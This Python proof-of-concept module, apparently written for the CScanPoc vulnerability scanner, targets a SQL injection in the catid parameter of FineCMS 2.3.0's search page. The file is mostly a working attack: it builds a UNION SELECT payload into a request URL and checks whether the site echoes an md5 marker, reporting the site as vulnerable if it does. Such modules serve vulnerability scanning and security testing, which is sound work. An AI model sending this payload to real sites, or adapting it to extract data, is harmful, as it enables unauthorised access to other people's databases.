# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'FineCMS_0005'  # 平台漏洞编号，留空
    name = 'FineCMS 2.3.0 /models/search_model.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-23'  # 漏洞公布时间
    desc = '''
        FineCMS 2.3.0 /dayrui/models/Search_model.php文件中,catid没有过滤
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-62681'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FineCMS'  # 漏洞应用名称
    product_version = '2.3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa4b4024-a17f-400c-962b-dfd7bca1c917'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/book/index.php?c=search&catid=3%20UNION%20ALL%20SELECT%20CONCAT(0x7165696a71,IFNULL("
                       "CAST(md5(3.1415)%20AS%20CHAR),0x20),0x716c787371)%23")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if "63e1f04640e83605c1d177544a5a0488" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
